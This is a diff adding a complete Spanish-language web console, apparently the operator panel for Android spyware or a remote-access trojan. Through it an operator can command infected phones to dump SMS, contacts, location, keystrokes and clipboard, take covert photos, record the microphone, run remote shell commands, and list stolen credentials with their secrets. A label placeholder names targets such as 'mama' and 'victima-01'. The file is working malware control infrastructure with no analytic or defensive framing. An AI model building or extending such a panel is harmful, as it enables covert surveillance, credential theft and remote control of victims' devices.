@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>CloudSync Console</title>
+<style>
+  :root{--bg:#0b0e13;--bg2:#11161f;--bg3:#171e2a;--line:#222c3c;--fg:#c8d3e0;--dim:#6b7a90;--acc:#3ea6ff;--ok:#2ecc71;--warn:#f1c40f;--bad:#e74c3c;--mono:ui-monospace,Consolas,monospace}
+  *{box-sizing:border-box}
+  body{margin:0;background:var(--bg);color:var(--fg);font:13px/1.45 system-ui,Segoe UI,Roboto,sans-serif}
+  #login{position:fixed;inset:0;background:var(--bg);display:flex;align-items:center;justify-content:center;z-index:50}
+  #login .box{background:var(--bg2);border:1px solid var(--line);border-radius:10px;padding:26px;width:320px}
+  #login h1{font-size:15px;margin:0 0 4px;letter-spacing:.14em;text-transform:uppercase}
+  #login p{color:var(--dim);margin:0 0 18px;font-size:12px}
+  input,select{width:100%;background:var(--bg3);border:1px solid var(--line);color:var(--fg);padding:8px 10px;border-radius:6px;font-family:var(--mono);font-size:12px;margin-bottom:10px}
+  button{background:var(--bg3);border:1px solid var(--line);color:var(--fg);padding:7px 11px;border-radius:6px;cursor:pointer;font-size:12px}
+  button:hover{border-color:var(--acc);color:#fff}
+  button.p{background:#12406b;border-color:#1d5c96;color:#dceaff}
+  button.d{border-color:#5a2222;color:#ffb3b3}
+  header{display:flex;align-items:center;gap:12px;padding:10px 14px;background:var(--bg2);border-bottom:1px solid var(--line);position:sticky;top:0;z-index:20}
+  header b{letter-spacing:.12em;text-transform:uppercase;font-size:12px}
+  header .sp{flex:1}
+  .tag{font-size:11px;color:var(--dim);border:1px solid var(--line);padding:2px 7px;border-radius:20px}
+  #wrap{display:flex;height:calc(100vh - 45px)}
+  #side{width:290px;border-right:1px solid var(--line);overflow:auto;background:var(--bg2)}
+  #main{flex:1;overflow:auto;padding:14px}
+  .dev{padding:9px 12px;border-bottom:1px solid var(--line);cursor:pointer}
+  .dev:hover{background:var(--bg3)}
+  .dev.sel{background:#12283f;border-left:3px solid var(--acc)}
+  .dev .n{font-weight:600}
+  .dev .m{color:var(--dim);font-size:11px;font-family:var(--mono)}
+  .dot{display:inline-block;width:7px;height:7px;border-radius:50%;margin-right:6px}
+  .on{background:var(--ok)} .off{background:#4a5568}
+  .card{background:var(--bg2);border:1px solid var(--line);border-radius:8px;padding:12px;margin-bottom:12px}
+  .card h3{margin:0 0 10px;font-size:12px;letter-spacing:.1em;text-transform:uppercase;color:var(--dim)}
+  .row{display:flex;gap:8px;flex-wrap:wrap}
+  table{width:100%;border-collapse:collapse;font-size:12px}
+  th,td{text-align:left;padding:5px 7px;border-bottom:1px solid var(--line);vertical-align:top}
+  th{color:var(--dim);font-weight:500;font-size:11px;text-transform:uppercase}
+  td.mono,.mono{font-family:var(--mono)}
+  .scroll{max-height:340px;overflow:auto}
+  #shots{display:grid;grid-template-columns:repeat(auto-fill,minmax(130px,1fr));gap:8px}
+  #shots img{width:100%;border:1px solid var(--line);border-radius:5px;cursor:pointer;display:block}
+  .kv{font-family:var(--mono);font-size:11px;color:var(--dim);word-break:break-all}
+  #term{background:#05080c;border:1px solid var(--line);border-radius:6px;padding:9px;height:190px;overflow:auto;font-family:var(--mono);font-size:12px;white-space:pre-wrap}
+  .g{color:var(--ok)} .y{color:var(--warn)} .r{color:var(--bad)} .b{color:var(--acc)}
+  #modal{position:fixed;inset:0;background:#000c;display:none;align-items:center;justify-content:center;z-index:60}
+  #modal img{max-width:94vw;max-height:94vh;border:1px solid var(--line)}
+  .grid2{display:grid;grid-template-columns:1fr 1fr;gap:12px}
+  @media(max-width:820px){#side{width:100%} #wrap{flex-direction:column} .grid2{grid-template-columns:1fr}}
+</style>
+</head>
+<body>
+
+<div id="login">
+  <div class="box">
+    <h1>CloudSync</h1>
+    <p>consola de operaciones</p>
+    <input id="lpass" type="password" placeholder="contrasena" autocomplete="current-password">
+    <input id="ltotp" type="text" placeholder="codigo 2FA (6 digitos)" inputmode="numeric">
+    <button class="p" style="width:100%" onclick="doLogin()">Entrar</button>
+    <div id="lerr" class="r" style="margin-top:10px;font-size:12px"></div>
+  </div>
+</div>
+
+<header>
+  <b>CloudSync Console</b>
+  <span class="tag" id="hver">-</span>
+  <span class="tag" id="hstat">-</span>
+  <span class="sp"></span>
+  <span class="tag" id="hclock"></span>
+  <button onclick="refreshAll()">Refrescar</button>
+  <button onclick="logout()">Salir</button>
+</header>
+
+<div id="wrap">
+  <div id="side"><div id="devlist"></div></div>
+  <div id="main">
+    <div id="nodev" class="card">Selecciona un dispositivo a la izquierda.</div>
+
+    <div id="devui" style="display:none">
+      <div class="card">
+        <h3>Dispositivo</h3>
+        <div id="dinfo" class="kv"></div>
+        <div class="row" style="margin-top:10px">
+          <input id="dlabel" placeholder="etiqueta (ej: mama, victima-01)" style="flex:1;margin:0">
+          <button onclick="saveLabel()">Guardar</button>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Acciones rapidas</h3>
+        <div class="row">
+          <button class="p" onclick="cmd('ping')">Ping</button>
+          <button class="p" onclick="cmd('screenshot')">Screenshot</button>
+          <button onclick="cmd('wake')">Despertar pantalla</button>
+          <button onclick="cmd('screen_off')">Apagar pantalla</button>
+          <button onclick="cmd('home')">Home</button>
+          <button onclick="cmd('back')">Atras</button>
+          <button onclick="cmd('recents')">Recientes</button>
+          <button onclick="cmd('lock')">Bloquear</button>
+          <button onclick="cmd('sms')">Listar SMS</button>
+          <button onclick="cmd('notifs')">Notificaciones</button>
+          <button onclick="cmd('contacts')">Contactos</button>
+          <button onclick="cmd('apps')">Apps instaladas</button>
+          <button onclick="cmd('loc')">Ubicacion</button>
+          <button onclick="cmd('wifi')">Redes WiFi</button>
+          <button onclick="cmd('clip')">Portapapeles</button>
+          <button onclick="cmd('photo',{cam:'back'})">Foto trasera</button>
+          <button onclick="cmd('photo',{cam:'front'})">Foto frontal</button>
+          <button onclick="cmd('mic',{secs:15})">Grabar micro 15s</button>
+          <button onclick="cmd('update')">Auto-actualizar</button>
+          <button class="d" onclick="cmd('die')">Matar proceso</button>
+        </div>
+      </div>
+
+      <div class="grid2">
+        <div class="card">
+          <h3>Control tactil</h3>
+          <div class="row">
+            <input id="tapx" type="number" placeholder="x" style="width:70px;margin:0">
+            <input id="tapy" type="number" placeholder="y" style="width:70px;margin:0">
+            <button onclick="cmd('tap',{x:+tapx.value,y:+tapy.value})">Tocar</button>
+            <button onclick="cmd('swipe',{x1:+tapx.value,y1:+tapy.value,x2:+(tapx.value),y2:+(tapy.value)+600,ms:250})">Swipe abajo</button>
+          </div>
+          <div class="row" style="margin-top:8px">
+            <input id="txto" placeholder="texto a escribir" style="flex:1;margin:0">
+            <button onclick="cmd('text',{text:txto.value})">Escribir</button>
+          </div>
+          <div class="row" style="margin-top:8px">
+            <input id="pkgo" placeholder="package (com.whatsapp)" style="flex:1;margin:0">
+            <button onclick="cmd('open',{pkg:pkgo.value})">Abrir</button>
+          </div>
+        </div>
+
+        <div class="card">
+          <h3>Terminal</h3>
+          <div id="term">listo.</div>
+          <div class="row" style="margin-top:8px">
+            <input id="termcmd" placeholder="comando shell" style="flex:1;margin:0" onkeydown="if(event.key==='Enter')runTerm()">
+            <button class="p" onclick="runTerm()">Ejecutar</button>
+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <h3>Pantalla <span id="shotinfo" class="kv"></span></h3>
+        <div id="shots"></div>
+      </div>
+
+      <div class="card">
+        <h3>Credenciales capturadas</h3>
+        <div class="scroll"><table id="creds"><thead><tr>
+          <th>hora</th><th>app</th><th>tipo</th><th>usuario</th><th>secreto</th>
+        </tr></thead><tbody></tbody></table></div>
+      </div>
+
+      <div class="card">
+        <h3>Actividad</h3>
+        <div class="row" style="margin-bottom:8px">
+          <select id="evtype" onchange="loadEvents()" style="width:auto;margin:0">
+            <option value="">todo</option>
+            <option value="app">apps</option>
+            <option value="key">teclas</option>
+            <option value="sms">sms</option>
+            <option value="loc">ubicacion</option>
+            <option value="notif">notificaciones</option>
+            <option value="call">llamadas</option>
+            <option value="net">red</option>
+            <option value="log">log</option>
+          </select>
+        </div>
+        <div class="scroll"><table id="events"><thead><tr>
+          <th style="width:110px">hora</th><th style="width:90px">tipo</th><th>datos</th>
+        </tr></thead><tbody></tbody></table></div>
+      </div>
+
+      <div class="card">
+        <h3>Historial de comandos</h3>
+        <div class="scroll"><table id="cmds"><thead><tr>
+          <th>id</th><th>cmd</th><th>estado</th><th>resultado</th>
+        </tr></thead><tbody></tbody></table></div>
+      </div>
+    </div>
+  </div>
+</div>
+
+<div id="modal" onclick="this.style.display='none'"><img id="modalimg"></div>
+
+<script>
+const BASE = location.pathname.replace(/\/+$/, '');
+let DEV = null, DEVICES = [], timer = null, timer2 = null;
+const $ = id => document.getElementById(id);
+
+async function api(p, opt) {
+  const r = await fetch(BASE + p, Object.assign({
+    headers: { 'Content-Type': 'application/json' }, credentials: 'same-origin'
+  }, opt || {}));
+  if (r.status === 401) { $('login').style.display = 'flex'; throw new Error('401'); }
+  return r.json();
+}
+async function doLogin() {
+  $('lerr').textContent = '';
+  try {
+    const r = await fetch(BASE + '/api/login', {
+      method: 'POST', headers: { 'Content-Type': 'application/json' }, credentials: 'same-origin',
+      body: JSON.stringify({ password: $('lpass').value, totp: $('ltotp').value })
+    });
+    const d = await r.json();
+    if (!d.ok) { $('lerr').textContent = d.error === 'bad_totp' ? 'codigo 2FA incorrecto' : 'contrasena incorrecta'; return; }
+    $('login').style.display = 'none';
+    boot();
+  } catch (e) { $('lerr').textContent = 'error de conexion'; }
+}
+async function logout() { await api('/api/logout', { method: 'POST' }); location.reload(); }
+
+async function boot() {
+  const me = await api('/api/me');
+  $('hver').textContent = 'v' + me.version + ' · ' + me.db;
+  $('hstat').textContent = me.totp ? '2FA activo' : '2FA off';
+  refreshAll();
+  clearInterval(timer);  timer  = setInterval(refreshAll, 4000);
+  clearInterval(timer2); timer2 = setInterval(() => {
+    if (DEV) { loadShots(); loadEvents(); loadCommands(); loadCreds(); }
+  }, 5000);
+}
+setInterval(() => { $('hclock').textContent = new Date().toLocaleTimeString(); }, 1000);
+
+async function refreshAll() {
+  const d = await api('/api/devices');
+  DEVICES = d.devices;
+  $('devlist').innerHTML = DEVICES.length ? DEVICES.map(v => `
+    <div class="dev ${DEV === v.id ? 'sel' : ''}" onclick="select('${v.id}')">
+      <div class="n"><span class="dot ${v.online ? 'on' : 'off'}"></span>${esc(v.label || v.model || v.id)}</div>
+      <div class="m">${esc(v.platform || '?')} · bat ${v.battery ?? '?'}% · ${v.online ? 'online' : v.idle + 's'}</div>
+      <div class="m">${esc(v.last_ip || '')}</div>
+    </div>`).join('') : '<div class="dev"><div class="m">sin dispositivos</div></div>';
+  if (DEV && !DEVICES.find(v => v.id === DEV)) { DEV = null; $('devui').style.display = 'none'; }
+  if (DEV) loadDevice();
+}
+
+function esc(s) { return String(s ?? '').replace(/[<>&"]/g, c => ({ '<': '&lt;', '>': '&gt;', '&': '&amp;', '"': '&quot;' }[c])); }
+
+async function select(id) {
+  DEV = id;
+  $('nodev').style.display = 'none';
+  $('devui').style.display = 'block';
+  refreshAll();
+  loadDevice(); loadShots(); loadEvents(); loadCreds(); loadCommands();
+}
+
+async function loadDevice() {
+  const d = await api('/api/device?id=' + encodeURIComponent(DEV));
+  const v = d.device;
+  $('dlabel').value = v.label || '';
+  $('dinfo').innerHTML = [
+    ['id', v.id], ['estado', v.online ? '<span class="g">online</span>' : 'visto hace ' + v.idle + 's'],
+    ['plataforma', v.platform], ['modelo', v.model], ['so', v.os_ver],
+    ['app', v.app_ver], ['bateria', (v.battery ?? '?') + '% ' + (v.charging ? '(cargando)' : '')],
+    ['red', v.net], ['pantalla', v.screen_on ? 'encendida' : 'apagada'],
+    ['operador', v.sim], ['locale', v.locale], ['ip', v.last_ip],
+    ['ultima vez', new Date(v.last_seen).toLocaleString()],
+    ['totales', d.counts.events + ' eventos · ' + d.counts.shots + ' capturas · ' + d.counts.creds + ' credenciales']
+  ].map(([k, val]) => '<div><b>' + k + ':</b> ' + esc(val ?? '-') + '</div>').join('');
+}
+
+async function saveLabel() {
+  await api('/api/device', { method: 'POST', body: JSON.stringify({ id: DEV, label: $('dlabel').value }) });
+  refreshAll();
+}
+
+async function loadShots() {
+  const d = await api('/api/shots?device=' + encodeURIComponent(DEV) + '&limit=48');
+  $('shotinfo').textContent = d.shots.length ? '(ultima: ' + new Date(d.shots[0].ts).toLocaleTimeString() + ')' : '(sin capturas)';
+  $('shots').innerHTML = d.shots.map(s =>
+    `<img src="${BASE}/shot/${s.id}" title="${new Date(s.ts).toLocaleString()}" onclick="zoom('${BASE}/shot/${s.id}')">`
+  ).join('');
+}
+function zoom(u) { $('modalimg').src = u; $('modal').style.display = 'flex'; }
+
+async function loadEvents() {
+  const t = $('evtype').value;
+  const d = await api('/api/events?device=' + encodeURIComponent(DEV) + '&limit=250&type=' + encodeURIComponent(t));
+  $('events').tBodies[0].innerHTML = d.events.map(e =>
+    `<tr><td class="mono">${new Date(e.ts).toLocaleTimeString()}</td><td>${esc(e.type)}</td>
+     <td class="mono">${esc(JSON.stringify(e.data))}</td></tr>`).join('');
+}
+
+async function loadCreds() {
+  const d = await api('/api/creds?device=' + encodeURIComponent(DEV));
+  $('creds').tBodies[0].innerHTML = d.creds.map(c =>
+    `<tr><td class="mono">${new Date(c.ts).toLocaleTimeString()}</td><td>${esc(c.pkg)}</td>
+     <td>${esc(c.kind)}</td><td class="mono">${esc(c.username)}</td>
+     <td class="mono b">${esc(c.secret)}</td></tr>`).join('');
+}
+
+async function loadCommands() {
+  const d = await api('/api/commands?device=' + encodeURIComponent(DEV));
+  $('cmds').tBodies[0].innerHTML = d.commands.map(c =>
+    `<tr><td class="mono">${c.id}</td><td class="mono">${esc(c.cmd)} ${esc(JSON.stringify(c.args))}</td>
+     <td>${c.status === 'done' ? '<span class="g">ok</span>' : c.status === 'error' ? '<span class="r">error</span>' : '<span class="y">' + c.status + '</span>'}</td>
+     <td class="mono">${esc((c.result || '').slice(0, 400))}</td></tr>`).join('');
+}
+
+async function cmd(c, a) {
+  if (!DEV) return;
+  await api('/api/command', { method: 'POST', body: JSON.stringify({ device_id: DEV, cmd: c, args: a || {} }) });
+  log('> ' + c + ' ' + JSON.stringify(a || {}), 'b');
+  setTimeout(loadCommands, 1200);
+}
+function runTerm() {
+  const c = $('termcmd').value.trim();
+  if (!c) return;
+  $('termcmd').value = '';
+  cmd('shell', { cmd: c });
+}
+function log(s, cls) {
+  const t = $('term');
+  t.innerHTML += '<div class="' + (cls || '') + '">' + esc(s) + '</div>';
+  t.scrollTop = t.scrollHeight;
+}
+
+let lastSeenCmd = 0;
+setInterval(async () => {
+  if (!DEV) return;
+  try {
+    const d = await api('/api/commands?device=' + encodeURIComponent(DEV));
+    for (const c of d.commands.slice().reverse()) {
+      if (c.id > lastSeenCmd && (c.status === 'done' || c.status === 'error')) {
+        lastSeenCmd = c.id;
+        if (c.cmd === 'shell') log('# ' + (c.result || '').slice(0, 4000), c.status === 'done' ? 'g' : 'r');
+      }
+    }
+  } catch {}
+}, 3000);
+
+api('/api/me').then(me => { $('login').style.display = 'none'; boot(); }).catch(() => {});
+</script>
+</body>
+</html>
